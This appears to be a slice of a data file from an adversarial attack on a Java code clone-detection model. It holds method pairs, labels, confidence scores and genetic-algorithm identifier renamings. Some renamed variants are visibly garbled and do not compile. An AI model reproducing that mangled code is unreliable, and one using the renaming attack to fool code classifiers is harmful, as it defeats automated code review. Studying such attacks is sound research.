            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            ftpClient.login((PrefPageOne.getValue(CONSTANTS.PREF_USERNAME)), FTPUtils.decrypt(PrefPageOne.getValue(CONSTANTS.PREF_PASSWORD)));
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            if (from != null) {
                FTPHolder ftpHolder = new FTPHolder(from, to, renameTo, false);
                synchedSet.add(ftpHolder);
            }
            JobHandler.aquireFTPLock();
            for (Iterator iter = synchedSet.iterator(); iter.hasNext(); ) {
                if (monitor != null && monitor.isCanceled()) {
                    JobHandler.releaseFTPLock();
                    ftpClient.quit();
                    return;
                }
                Thread.yield();
                FTPHolder element = (FTPHolder) iter.next();
                ftpClient.setType(FTPTransferType.ASCII);
                ftpClient.put(element.from, element.to);
                if (element.renameTo != null) {
                    try {
                        ftpClient.delete(element.renameTo);
                    } catch (Exception e) {
                    }
                    ftpClient.rename(element.to, element.renameTo);
                    log.info(""RENAME: "" + element.to + ""To: "" + element.renameTo);
                }
            }
            JobHandler.releaseFTPLock();
            ftpClient.quit();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        } catch (FTPException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        synchedSet.clear();
    }
 <SPLIT>     public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        mButton1 = (Button) findViewById(R.id.myButton1);
        mButton2 = (Button) findViewById(R.id.myButton2);
        mTextView1 = (TextView) findViewById(R.id.myTextView1);
        mButton1.setOnClickListener(new Button.OnClickListener() {

            public void onClick(View v) {
                String uriAPI = ""http://www.sina.com"";
                HttpPost httpRequest = new HttpPost(uriAPI);
                List<NameValuePair> params = new ArrayList<NameValuePair>();
                params.add(new BasicNameValuePair(""str"", ""post string""));
                try {
                    httpRequest.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
                    HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
                    if (httpResponse.getStatusLine().getStatusCode() == 200) {
                        String strResult = EntityUtils.toString(httpResponse.getEntity());
                        mTextView1.setText(strResult);
                    } else {
                        mTextView1.setText(""Error Response: "" + httpResponse.getStatusLine().toString());
                    }
                } catch (ClientProtocolException e) {
                    mTextView1.setText(e.getMessage().toString());
                    e.printStackTrace();
                } catch (IOException e) {
                    mTextView1.setText(e.getMessage().toString());
                    e.printStackTrace();
                } catch (Exception e) {
                    mTextView1.setText(e.getMessage().toString());
                    e.printStackTrace();
                }
            }
        });
        mButton2.setOnClickListener(new Button.OnClickListener() {

            public void onClick(View v) {
                String uriAPI = ""http://www.sina.com"";
                HttpGet httpRequest = new HttpGet(uriAPI);
                try {
                    HttpResponse httpResponse = new DefaultHttpClient().execute(httpRequest);
                    if (httpResponse.getStatusLine().getStatusCode() == 200) {
                        String strResult = EntityUtils.toString(httpResponse.getEntity());
                        strResult = eregi_replace(""(\r\n|\r|\n|\n\r)"", """", strResult);
                        mTextView1.setText(strResult);
                    } else {
                        mTextView1.setText(""Error Response: "" + httpResponse.getStatusLine().toString());
                    }
                } catch (ClientProtocolException e) {
                    mTextView1.setText(e.getMessage().toString());
                    e.printStackTrace();
                } catch (IOException e) {
                    mTextView1.setText(e.getMessage().toString());
                    e.printStackTrace();
                } catch (Exception e) {
                    mTextView1.setText(e.getMessage().toString());
                    e.printStackTrace();
                }
            }
        });
    }
",405,"    public static void polishOff(IProgressMonitor timer, String from, String with, String renseTo) {
        if (timer != null && timer.isCanceled()) {
            return;
        }
        try {
            fttpStream = new FTPClient();
            fttpStream.setRemoteAddr(InetAddress.getByName(PrefPageOne.getValue(CONSTANTS.PREF_HOST)));
            fttpStream.setControlPort(PrefPageOne.getIntValue(CONSTANTS.PREF_FTPPORT));
            fttpStream.connect();
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            fttpStream.login((PrefPageOne.getValue(CONSTANTS.PREF_USERNAME)), FTPUtils.decrypt(PrefPageOne.getValue(CONSTANTS.PREF_PASSWORD)));
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            if (from != null) {
                FTPHolder fftpHolder= new FTPHolder(from, with, renseTo, false);
                synchedSet.add(ftpHolder);
            }
            JobHandler.aquireFTPLock();
            for (Iterator iter = synchedSet.iterator(); iter.hasNext(); ) {
                if (timer != null && timer.isCanceled()) {
                    JobHandler.releaseFTPLock();
                    fttpStream.quit();
                    return;
                }
                Thread.yield();
                FTPHolder plugin = (FTPHolder) iter.next();
                fttpStream.setType(FTPTransferType.ASCII);
                ftfttpStreamut(elpluginrom, elpluginith);
                if plugint.renseTo != null) {
                    try {
                       fttpStreamt.deleteplugint.renseTo);
                    } catch (Exception e) {
                    }
                    ffttpStreamrename(epluginwith,plugint.renseTo);
                    log.info(""RENAME: "" + epluginwith + ""To: "" +plugint.renseTo);
                }
            }
            JobHandler.releaseFTPLock();
            fttpStream.quit();
        } catch (UnknownHostException e) {
            e.printStackTrace();
        } catch (FTPException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        synchedSet.clear();
    }
",LABEL_0,LABEL_0,0.5074496865272522,1,"polishOff,monitor,from,to,renameTo,ftpClient,ftpHolder,iter,element",,,,10,"polishOff:polishOff,monitor:timer,from:from,to:with,renameTo:renseTo,ftpClient:fttpStream,ftpHolder:ftpHolder,iter:iter,element:plugin,",4,GA,697,0.27294389009475706,ga,[]
208,"    static String calculateProfileDiffDigest(String profileDiff, boolean normaliseWhitespace) throws Exception {
        if (normaliseWhitespace) {
            profileDiff = removeWhitespaces(profileDiff);
        }
        MessageDigest md = MessageDigest.getInstance(""MD5"");
        md.update(profileDiff.getBytes());
        return new BASE64Encoder().encode(md.digest());
    }
 <SPLIT>     public void createVendorSignature() {
        byte b;
        try {
            _vendorMessageDigest = MessageDigest.getInstance(""MD5"");
            _vendorSig = Signature.getInstance(""MD5/RSA/PKCS#1"");
            _vendorSig.initSign((PrivateKey) _vendorPrivateKey);
            _vendorMessageDigest.update(getBankString().getBytes());
            _vendorMessageDigestBytes = _vendorMessageDigest.digest();
            _vendorSig.update(_vendorMessageDigestBytes);
            _vendorSignatureBytes = _vendorSig.sign();
        } catch (Exception e) {
        }
        ;
    }
",66,,LABEL_1,LABEL_1,LABEL_1,-1,"calculateProfileDiffDigest,profileDiff,normaliseWhitespace,md",,,,0,,0,GA,1204,0.4263997197151184,failed,[]
209,"    public static long getFileSize(String address) {
        URL url = null;
        try {
            url = new URL(address);
            System.err.println(""Indirizzo valido - "" + url.toString().substring(0, 10) + ""..."");
        } catch (MalformedURLException ex) {
            System.err.println(""Indirizzo non valido!"");
        }
        try {
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestProperty(""Range"", ""bytes=0-"");
            connection.connect();
            return connection.getContentLength();
        } catch (IOException ioe) {
            System.err.println(""I/O error!"");
            return 0;
        }
    }
 <SPLIT>     public static void setContenu(ContenuFichierElectronique contenuFichier, FichierElectronique fichierElectronique, UtilisateurIFGD utilisateurCourant) throws IOException, DocumentVideException {
        if (contenuFichier != null) {
            SupportDocument support = fichierElectronique.getSupport();
            support.setFichierElectronique(fichierElectronique);
            FicheDocument ficheDocument = support.getFicheDocument();
            String nomFichier = contenuFichier.getNomFichier();
            String extension = FilenameUtils.getExtension(nomFichier);
            if (ficheDocument.getFichierElectronique(nomFichier) != null) {
                FichierElectronique fichierElectroniqueExistant = ficheDocument.getFichierElectronique(nomFichier);
                if (fichierElectroniqueExistant.getId() != null && !fichierElectroniqueExistant.getId().equals(fichierElectronique.getId())) {
                    throw new FichierElectroniqueExistantException(nomFichier, ficheDocument);
                }
            }
            if (fichierElectronique.getId() == null) {
                if (OfficeDocumentPropertiesUtil.canWriteIdIGID(extension)) {
                    Long idIgid = OfficeDocumentPropertiesUtil.getIdIGID(contenuFichier);
                    if (idIgid != null) {
                        throw new FichierElectroniqueExistantException(nomFichier, idIgid, ficheDocument);
                    }
                }
            }
            InputStream inputStream = contenuFichier.getInputStream();
            OutputStream outputStream = fichierElectronique.getOutputStream();
            try {
                IOUtils.copy(inputStream, outputStream);
            } finally {
                try {
                    inputStream.close();
                } finally {
                    outputStream.close();
                }
            }
            String typeMime = contenuFichier.getContentType();
            long tailleFichier = contenuFichier.getTailleFichier();
            Date dateDerniereModification = new Date();
            fichierElectronique.setNom(nomFichier);
            fichierElectronique.setTypeMime(extension);
            creerFormatSiNecessaire(typeMime, extension);
            fichierElectronique.setTaille(tailleFichier);
            fichierElectronique.setDateDerniereModification(dateDerniereModification);
            fichierElectronique.setSoumetteur(utilisateurCourant);
            if (extension.endsWith(""msg"")) {
                CourrielUtils.peuplerMetadonneesCourriel(fichierElectronique.getNom(), ficheDocument, contenuFichier.getInputStream(), utilisateurCourant);
            } else if (extension.endsWith(""eml"")) {
                Map<String, Object> properties = new GestionnaireProprietesMimeMessageParser().parseMsg(contenuFichier.getInputStream());
                CourrielUtils.peuplerMetadonneesCourriel(fichierElectronique.getNom(), ficheDocument, properties, utilisateurCourant);
            } else {
                FGDProprietesDocumentUtils.copierMetadonneesProprietes(fichierElectronique, ficheDocument);
            }
        }
    }
",135,"    public static long getByteBytes(String address) {
        URL file = null;
        try {
            file = new URL(address);
            System.err.println(""Indirizzo valido - "" + file.toString().substring(0, 10) + ""..."");
        } catch (MalformedURLException ex) {
            System.err.println(""Indirizzo non valido!"");
        }
        try {
            HttpURLConnection cservice= (HttpURLConnection) file.openConnection();
            service.setRequestProperty(""Range"", ""bytes=0-"");
            service.connect();
            return service.getContentLength();
        } catch (IOException ioe) {
            System.err.println(""I/O error!"");
            return 0;
        }
    }
",LABEL_0,LABEL_0,0.5197449326515198,1,"getFileSize,address,url,connection",,,,2,"getFileSize:getByteBytes,address:address,url:file,connection:service,",1,GA,281,0.10578947861989339,ga,[]
210,"    private synchronized File download() throws AMSpacksException {
        String a = addr.url.toExternalForm();
        int p = a.lastIndexOf('/');
        if (p < 0) {
            p = a.lastIndexOf('\\');
        }
        if (p < 0) {
            a = """" + Math.random();
        } else {
            a = a.substring(p + 1);
        }
        File td = null;
        try {
            td = File.createTempFile(a, """").getParentFile();
        } catch (IOException ex) {
            td = new File(""."");
        }
        File f = new File(td, a);
        td.delete();
        long total = addr.update.getSize();
        int progress = 0;
        try {
            InputStream in = new BufferedInputStream(addr.url.openStream());
            FileOutputStream out = new FileOutputStream(f);
            byte[] buf = new byte[500];
            int n;
            long percentage = 0;
            callback.updateProgress(percentage);
            do {
                n = in.read(buf);
                if (n > 0) {
                    out.write(buf, 0, n);
                    progress += n;
                    long tmpPercentage = progress * 100 / total;
                    if (percentage != tmpPercentage) {
                        percentage = tmpPercentage;
                        callback.updateProgress(percentage);
                    }
                }
            } while (n > 0);
            in.close();
            out.flush();
            out.close();
        } catch (Exception ex) {
            f.delete();
            throw new DownloadFailedException(""Error downloading update."", ex);
        }
        long size = f.length();
        String checksum = CheckSumFinder.checkSum(f);
        if (size == addr.update.getSize() && checksum.equalsIgnoreCase(addr.update.getChecksum())) return f; else {
            f.delete();
            throw new CheckSumMismathchException(""Checksum mismatch: "" + addr.update.getChecksum() + "" expected but was "" + checksum);
        }
    }
 <SPLIT>     public static void doVersionCheck(View view) {
        view.showWaitCursor();
        try {
            URL url = new URL(jEdit.getProperty(""version-check.url""));
            InputStream in = url.openStream();
            BufferedReader bin = new BufferedReader(new InputStreamReader(in));
            String line;
            String version = null;
            String build = null;
            while ((line = bin.readLine()) != null) {
                if (line.startsWith("".version"")) version = line.substring(8).trim(); else if (line.startsWith("".build"")) build = line.substring(6).trim();
            }
            bin.close();
            if (version != null && build != null) {
                if (jEdit.getBuild().compareTo(build) < 0) newVersionAvailable(view, version, url); else {
                    GUIUtilities.message(view, ""version-check"" + "".up-to-date"", new String[0]);
                }
            }
        } catch (IOException e) {
            String[] args = { jEdit.getProperty(""version-check.url""), e.toString() };
            GUIUtilities.error(view, ""read-error"", args);
        }
        view.hideWaitCursor();
    }
",401,,LABEL_0,LABEL_0,LABEL_0,-1,"download,a,p,td,f,total,progress,in,out,buf,n,percentage,tmpPercentage,size,checksum",,,,0,,0,GA,5645,2.1376683433850605,failed,[]
211,"    public static String installOvalDefinitions(final String xml_location) {
        InputStream in_stream = null;
        try {
            URL url = _toURL(xml_location);
            if (url == null) {
                in_stream = new FileInputStream(xml_location);
            } else {
                in_stream = url.openStream();
            }
        } catch (IOException ex) {
            throw new OvalException(ex);
        }
        Class<OvalDefinitions> type = OvalDefinitions.class;
        OvalDefinitions object = _unmarshalObject(type, in_stream);
        String pid = _getDatastore().save(type, object);
        return pid;
    }
 <SPLIT>     private boolean saveNodeMeta(NodeInfo info, int properties) {
        boolean rCode = false;
        String query = mServer + ""save.php"" + (""?id="" + info.getId());
        try {
            URL url = new URL(query);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            byte[] body = Helpers.EncodeString(Helpers.ASCII, createURLEncodedPropertyString(info, properties));
            conn.setAllowUserInteraction(false);
            conn.setRequestMethod(""POST"");
            conn.setRequestProperty(""Content-Type"", ""application/x-www-form-urlencoded"");
            setCredentials(conn);
            conn.setDoOutput(true);
            conn.getOutputStream().write(body);
            rCode = saveNode(info, conn);
        } catch (Exception ex) {
            System.out.println(""Exception: "" + ex.toString());
        }
        return rCode;
    }
",106,,LABEL_0,LABEL_0,LABEL_0,-1,"installOvalDefinitions,xml_location,in_stream,url,type,object,pid",,,,0,,0,GA,2628,0.9378411650657654,failed,[]
212,"    public static String getWebPage(URL urlObj) {
        try {
            String content = """";
            InputStreamReader is = new InputStreamReader(urlObj.openStream());
            BufferedReader reader = new BufferedReader(is);
            String line;
            while ((line = reader.readLine()) != null) {
                content += line;
            }
            return content;
        } catch (IOException e) {
            throw new Error(""The page "" + dbg.quote(urlObj.toString()) + ""could not be retrieved."" + ""\nThis is could be caused by a number of things:"" + ""\n"" + ""\n  - the computer hosting the web page you want is down, or has returned an error"" + ""\n  - your computer does not have Internet access"" + ""\n  - the heat death of the universe has occurred, taking down all web servers with it"");
        }
    }
 <SPLIT>     private String getEncoding() throws IOException {
        BufferedReader reader = null;
        String encoding = null;
        try {
            URLConnection connection = url.openConnection();
            Map<String, List<String>> header = connection.getHeaderFields();
            for (Map.Entry<String, List<String>> entry : header.entrySet()) {
                if (entry.getKey().toLowerCase().equals(""content-type"")) {
                    String item = entry.getValue().toString().toLowerCase();
                    if (item.contains(""charset"")) {
                        encoding = extractEncoding(item);
                        if (encoding != null && !encoding.isEmpty()) return encoding;
                    }
                }
            }
            reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.toLowerCase();
                if (line.contains(""charset"") || line.contains(""encoding"")) {
                    encoding = extractEncoding(line);
                    if (encoding != null && !encoding.isEmpty()) return encoding;
                }
            }
            return STANDARDENCODING;
        } finally {
            if (reader != null) reader.close();
        }
    }
",119,,LABEL_1,LABEL_1,LABEL_1,-1,"getWebPage,urlObj,content,is,reader,line",,,,0,,0,GA,2231,0.803950834274292,failed,[]
213,"    public static String SHA1(String text) {
        byte[] sha1hash = new byte[40];
        try {
            MessageDigest md = MessageDigest.getInstance(""SHA-1"");
            md.update(text.getBytes(""iso-8859-1""), 0, text.length());
            sha1hash = md.digest();
        } catch (UnsupportedEncodingException ex) {
            Logger.getLogger(Converter.class.getName()).log(Level.SEVERE, null, ex);
        } catch (NoSuchAlgorithmException ex) {
            Logger.getLogger(Converter.class.getName()).log(Level.SEVERE, null, ex);
        }
        return convertToHex(sha1hash);
    }
 <SPLIT>     private static byte[] baseHash(String name, String password) {
        try {
            MessageDigest digest = MessageDigest.getInstance(""MD5"");
            digest.reset();
            digest.update(name.toLowerCase().getBytes());
            digest.update(password.getBytes());
            return digest.digest();
        } catch (NoSuchAlgorithmException ex) {
            d(""MD5 algorithm not found!"");
            throw new RuntimeException(""MD5 algorithm not found! Unable to authenticate"");
        }
    }
",135,,LABEL_1,LABEL_1,LABEL_1,-1,"SHA1,text,sha1hash,md",,,,0,,0,GA,1530,0.5436338106791179,failed,[]
214,"    @Test
    public void testIdentification() {
        try {
            String username = ""muchu"";
            String password = ""123"";
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.update(password.getBytes());
            LogService logServiceMock = EasyMock.createMock(LogService.class);
            DbService dbServiceMock = EasyMock.createMock(DbService.class);
            userServ.setDbServ(dbServiceMock);
            userServ.setLogger(logServiceMock);
            logServiceMock.info(DbUserServiceImpl.class, "">>>identification "" + username + ""<<<"");
            IFeelerUser user = new FeelerUserImpl();
            user.setUsername(username);
            user.setPassword(new String(md5.digest()));
            EasyMock.expect(dbServiceMock.queryFeelerUser(username)).andReturn(user);
            EasyMock.replay(logServiceMock, dbServiceMock);
            Assert.assertTrue(userServ.identification(username, password));
            EasyMock.verify(logServiceMock, dbServiceMock);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }
 <SPLIT>     private void getRandomGUID(boolean secure) {
        MessageDigest md5 = null;
        StringBuffer sbValueBeforeMD5 = new StringBuffer();
        try {
            md5 = MessageDigest.getInstance(""MD5"");
        } catch (NoSuchAlgorithmException e) {
            logger.error(""At RandomGUID !!!"", e);
        }
        try {
            long time = System.currentTimeMillis();
            long rand = 0;
            if (secure) {
                rand = mySecureRand.nextLong();
            } else {
                rand = myRand.nextLong();
            }
            sbValueBeforeMD5.append(s_id);
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(time));
            sbValueBeforeMD5.append("":"");
            sbValueBeforeMD5.append(Long.toString(rand));
            valueBeforeMD5 = sbValueBeforeMD5.toString();
            md5.update(valueBeforeMD5.getBytes());
            byte[] array = md5.digest();
            StringBuffer sb = new StringBuffer();
            for (int j = 0; j < array.length; ++j) {
                int b = array[j] & 0xFF;
                if (b < 0x10) sb.append('0');
                sb.append(Integer.toHexString(b));
            }
            valueAfterMD5 = sb.toString();
        } catch (Exception e) {
            logger.error(""At RandomGUID !!!"", e);
        }
    }
",199,,LABEL_1,LABEL_1,LABEL_1,-1,"testIdentification,username,password,md5,logServiceMock,dbServiceMock,user",,,,0,,0,GA,2658,0.97185800075531,failed,[]
215,"    @Override
    public String transformSingleFile(X3DEditorSupport.X3dEditor xed) {
        Node[] node = xed.getActivatedNodes();
        X3DDataObject dob = (X3DDataObject) xed.getX3dEditorSupport().getDataObject();
        FileObject mySrc = dob.getPrimaryFile();
        File mySrcF = FileUtil.toFile(mySrc);
        File myOutF = new File(mySrcF.getParentFile(), mySrc.getName() + "".x3dv.gz"");
        TransformListener co = TransformListener.getInstance();
        co.message(NbBundle.getMessage(getClass(), ""Gzip_compression_starting""));
        co.message(NbBundle.getMessage(getClass(), ""Saving_as_"") + myOutF.getAbsolutePath());
        co.moveToFront();
        co.setNode(node[0]);
        try {
            String x3dvFile = ExportClassicVRMLAction.instance.transformSingleFile(xed);
            FileInputStream fis = new FileInputStream(new File(x3dvFile));
            GZIPOutputStream gzos = new GZIPOutputStream(new FileOutputStream(myOutF));
            byte[] buf = new byte[4096];
            int ret;
            while ((ret = fis.read(buf)) > 0) gzos.write(buf, 0, ret);
            gzos.close();
        } catch (Exception ex) {
            co.message(NbBundle.getMessage(getClass(), ""Exception:__"") + ex.getLocalizedMessage());
            return null;
        }
        co.message(NbBundle.getMessage(getClass(), ""Gzip_compression_complete""));
        return myOutF.getAbsolutePath();
    }
 <SPLIT>     public static boolean copyTextFile(File src, File dst) {
        try {
            BufferedInputStream bis = new BufferedInputStream(new FileInputStream(src));
            BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(dst));
            byte[] buf = new byte[1024];
            int readsize = 0;
            while ((readsize = bis.read(buf)) != -1) {
                bos.write(buf, 0, readsize);
            }
            bos.flush();
            bos.close();
            bis.close();
        } catch (IOException e) {
            ServerConsoleServlet.printSystemLog(e.toString() + "" "" + e.getMessage(), ServerConsoleServlet.LOG_ERROR);
            return false;
        }
        return true;
    }
",296,,LABEL_1,LABEL_1,LABEL_1,-1,"transformSingleFile,xed,node,dob,mySrc,mySrcF,myOutF,co,x3dvFile,fis,gzos,buf,ret",,,,0,,0,GA,4600,1.6920495629310608,failed,[]
216,"    public void metodo1() {
        int temp;
        boolean flagDesordenado = true;
        while (flagDesordenado) {
            flagDesordenado = false;
            for (int i = 0; i < this.tamanoTabla - 1; i++) {
                if (tabla[i] > tabla[i + 1]) {
                    flagDesordenado = true;
                    temp = tabla[i];
                    tabla[i] = tabla[i + 1];
                    tabla[i + 1] = temp;
                }
            }
        }
    }
 <SPLIT>     private void displayDiffResults() throws IOException {
        File outFile = File.createTempFile(""diff"", "".htm"");
        outFile.deleteOnExit();
        FileOutputStream outStream = new FileOutputStream(outFile);
        BufferedWriter out = new BufferedWriter(new OutputStreamWriter(outStream));
        out.write(""<html><head><title>LOC Differences</title>\n"" + SCRIPT + ""</head>\n"" + ""<body bgcolor='#ffffff'>\n"" + ""<div onMouseOver=\""window.defaultStatus='Metrics'\"">\n"");
        if (addedTable.length() > 0) {
            out.write(""<table border><tr><th>Files Added:</th>"" + ""<th>Add</th><th>Type</th></tr>"");
            out.write(addedTable.toString());
            out.write(""</table><br><br>"");
        }
        if (modifiedTable.length() > 0) {
            out.write(""<table border><tr><th>Files Modified:</th>"" + ""<th>Base</th><th>Del</th><th>Mod</th><th>Add</th>"" + ""<th>Total</th><th>Type</th></tr>"");
            out.write(modifiedTable.toString());
            out.write(""</table><br><br>"");
        }
        if (deletedTable.length() > 0) {
            out.write(""<table border><tr><th>Files Deleted:</th>"" + ""<th>Del</th><th>Type</th></tr>"");
            out.write(deletedTable.toString());
            out.write(""</table><br><br>"");
        }
        out.write(""<table name=METRICS BORDER>\n"");
        if (modifiedTable.length() > 0 || deletedTable.length() > 0) {
            out.write(""<tr><td>Base:&nbsp;</td><td>"");
            out.write(Long.toString(base));
            out.write(""</td></tr>\n<tr><td>Deleted:&nbsp;</td><td>"");
            out.write(Long.toString(deleted));
            out.write(""</td></tr>\n<tr><td>Modified:&nbsp;</td><td>"");
            out.write(Long.toString(modified));
            out.write(""</td></tr>\n<tr><td>Added:&nbsp;</td><td>"");
            out.write(Long.toString(added));
            out.write(""</td></tr>\n<tr><td>New & Changed:&nbsp;</td><td>"");
            out.write(Long.toString(added + modified));
            out.write(""</td></tr>\n"");
        }
        out.write(""<tr><td>Total:&nbsp;</td><td>"");
        out.write(Long.toString(total));
        out.write(""</td></tr>\n</table></div>"");
        redlinesOut.close();
        out.flush();
        InputStream redlines = new FileInputStream(redlinesTempFile);
        byte[] buffer = new byte[4096];
        int bytesRead;
        while ((bytesRead = redlines.read(buffer)) != -1) outStream.write(buffer, 0, bytesRead);
        outStream.write(""</BODY></HTML>"".getBytes());
        outStream.close();
        Browser.launch(outFile.toURL().toString());
    }
",94,,LABEL_0,LABEL_0,LABEL_0,-1,"metodo1,temp,flagDesordenado,i,tabla",,,,0,,0,GA,1789,0.6676826635996501,failed,[]
217,"    private String unJar(String jarPath, String jarEntry) {
        String path;
        if (jarPath.lastIndexOf(""lib/"") >= 0) path = jarPath.substring(0, jarPath.lastIndexOf(""lib/"")); else path = jarPath.substring(0, jarPath.lastIndexOf(""/""));
        String relPath = jarEntry.substring(0, jarEntry.lastIndexOf(""/""));
        try {
            new File(path + ""/"" + relPath).mkdirs();
            JarFile jar = new JarFile(jarPath);
            ZipEntry ze = jar.getEntry(jarEntry);
            File bin = new File(path + ""/"" + jarEntry);
            IOUtils.copy(jar.getInputStream(ze), new FileOutputStream(bin));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return path + ""/"" + jarEntry;
    }
 <SPLIT>     public static void copyExternalResource(File sourceFile, File destFile) throws IOException {
        if (!destFile.exists()) {
            destFile.createNewFile();
        }
        FileChannel source = null;
        FileChannel destination = null;
        try {
            source = new FileInputStream(sourceFile).getChannel();
            destination = new FileOutputStream(destFile).getChannel();
            destination.transferFrom(source, 0, source.size());
        } finally {
            closeQuietly(source);
            closeQuietly(destination);
        }
    }
",178,,LABEL_1,LABEL_1,LABEL_1,-1,"unJar,jarPath,jarEntry,path,relPath,jar,ze,bin",,,,0,,0,GA,2849,1.0199189066886902,failed,[]
218,"    @Override
    public String getMessageDigest() throws SarasvatiLoadException {
        if (messageDigest == null) {
            Collections.sort(nodes);
            Collections.sort(externals);
            try {
                MessageDigest digest = MessageDigest.getInstance(""SHA1"");
                digest.update(name.getBytes());
                for (XmlNode node : nodes) {
                    node.addToDigest(digest);
                }
                for (XmlExternal external : externals) {
                    external.addToDigest(digest);
                }
                messageDigest = SvUtil.getHexString(digest.digest());
            } catch (NoSuchAlgorithmException nsae) {
                throw new SarasvatiException(""Unable to load SHA1 algorithm"", nsae);
            }
        }
        return messageDigest;
    }
 <SPLIT>     public int read(String name) {
        status = STATUS_OK;
        try {
            name = name.trim();
            if (name.indexOf(""://"") > 0) {
                URL url = new URL(name);
                in = new BufferedInputStream(url.openStream());
            } else {
                in = new BufferedInputStream(new FileInputStream(name));
            }
            status = read(in);
        } catch (IOException e) {
            status = STATUS_OPEN_ERROR;
        }
        return status;
    }
",126,,LABEL_0,LABEL_0,LABEL_0,-1,"getMessageDigest,digest,node,external,messageDigest",,,,0,,0,GA,1855,0.6610461831092834,failed,[]
219,"    public String getmd5(String password) {
        String pwHash = """";
        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance(""MD5"");
            md.reset();
            md.update(password.getBytes());
            byte[] b = md.digest();
            for (int i = 0; i < b.length; i++) {
                pwHash += Integer.toString((b[i] & 0xFF) + 0x100, 16).substring(1);
            }
        } catch (NoSuchAlgorithmException ex) {
            Logger.fatal(""MD5 Hash Algorithm not found"", ex);
        }
        Logger.info(""PWHash erzeugt und wird übergeben"");
        return pwHash;
    }
 <SPLIT>     private String makeLoginRequest(URL url) throws IOException {
        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
        urlConnection.setRequestMethod(""POST"");
        urlConnection.setDoInput(true);
        urlConnection.setDoOutput(true);
        urlConnection.setUseCaches(false);
        urlConnection.setRequestProperty(""Content-Type"", ""application/x-www-form-urlencoded"");
        StringBuilder content = new StringBuilder();
        content.append(""Email="").append(URLEncoder.encode(EMAIL, ""UTF-8""));
        content.append(""&Passwd="").append(URLEncoder.encode(PASSWORD, ""UTF-8""));
        content.append(""&service="").append(URLEncoder.encode(SERVICE, ""UTF-8""));
        content.append(""&source="").append(URLEncoder.encode(""Google Base data API"", ""UTF-8""));
        OutputStream outputStream = urlConnection.getOutputStream();
        outputStream.write(content.toString().getBytes(""UTF-8""));
        outputStream.close();
        int responseCode = urlConnection.getResponseCode();
        InputStream inputStream;
        if (responseCode == HttpURLConnection.HTTP_OK) {
            inputStream = urlConnection.getInputStream();
        } else {
            inputStream = urlConnection.getErrorStream();
        }
        return toString(inputStream);
    }
",136,,LABEL_0,LABEL_0,LABEL_0,-1,"getmd5,password,pwHash,md,b,i",,,,0,,0,GA,2292,0.8268448313077291,failed,[]
220,"    boolean checkIfUserExists(String username) throws IOException {
        try {
            URL url = new URL(WS_URL + ""/user/"" + URLEncoder.encode(username, ""UTF-8"") + ""/profile.xml"");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.connect();
            InputStream is = conn.getInputStream();
            is.close();
            return true;
        } catch (FileNotFoundException e) {
            return false;
        }
    }
 <SPLIT>     public static void addRecipe(String name, String instructions, int categoryId, String[][] ainekset) throws Exception {
        PreparedStatement pst1 = null;
        PreparedStatement pst2 = null;
        ResultSet rs = null;
        int retVal = -1;
        try {
            pst1 = conn.prepareStatement(""INSERT INTO recipes (name, instructions, category_id) VALUES (?, ?, ?)"");
            pst1.setString(1, name);
            pst1.setString(2, instructions);
            pst1.setInt(3, categoryId);
            if (pst1.executeUpdate() > 0) {
                pst2 = conn.prepareStatement(""SELECT recipe_id FROM recipes WHERE name = ? AND instructions = ? AND category_id = ?"");
                pst2.setString(1, name);
                pst2.setString(2, instructions);
                pst2.setInt(3, categoryId);
                rs = pst2.executeQuery();
                if (rs.next()) {
                    int id = rs.getInt(1);
                    System.out.println(""Lis�t��n ainesosat"");
                    String[] aines;
                    for (int i = 0; i < ainekset.length; ++i) {
                        aines = ainekset[i];
                        addIngredient(id, aines[0], aines[1], Integer.parseInt(aines[2]), Integer.parseInt(aines[3]));
                    }
                    retVal = id;
                } else {
                    retVal = -1;
                }
            } else {
                retVal = -1;
            }
            conn.commit();
        } catch (Exception e) {
            conn.rollback();
            throw new Exception(""Reseptin lis�ys ep�onnistui. Poikkeus: "" + e.getMessage());
        }
    }
",88,,LABEL_0,LABEL_0,LABEL_0,-1,"checkIfUserExists,username,url,conn,is",,,,0,,0,GA,1816,0.6561873515446981,failed,[]
221,"    public static String getContent(HttpUriRequest request) throws Exception {
        StringBuffer sb = new StringBuffer();
        HttpClient client = new DefaultHttpClient();
        HttpParams httpParams = client.getParams();
        HttpConnectionParams.setConnectionTimeout(httpParams, 30000);
        HttpConnectionParams.setSoTimeout(httpParams, 50000);
        HttpResponse response = client.execute(request);
        HttpEntity entity = response.getEntity();
        if (entity != null) {
            BufferedReader reader = new BufferedReader(new InputStreamReader(entity.getContent(), ""UTF-8""), 8192);
            String line = null;
            while ((line = reader.readLine()) != null) {
                sb.append(line + ""\n"");
            }
            reader.close();
        }
        return sb.toString();
    }
 <SPLIT>     private static long copy(InputStream source, OutputStream sink) {
        try {
            return IOUtils.copyLarge(source, sink);
        } catch (IOException e) {
            logger.error(e.toString(), e);
            throw new FaultException(""System error copying stream"", e);
        } finally {
            IOUtils.closeQuietly(source);
            IOUtils.closeQuietly(sink);
        }
    }
